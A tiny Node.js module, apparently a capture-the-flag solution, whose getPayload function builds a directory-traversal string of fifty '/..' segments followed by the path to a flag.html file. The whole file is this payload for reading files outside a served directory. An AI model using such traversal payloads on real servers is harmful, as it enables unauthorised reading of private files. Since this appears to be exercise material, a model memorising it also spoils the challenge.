function getPayload() {
  const path = require('path');  // Import the path module
  const pathToFlag = path.resolve(__dirname, "../flag.html");
  return () => `/..`.repeat(50) + pathToFlag;
}

module.exports = { getPayload };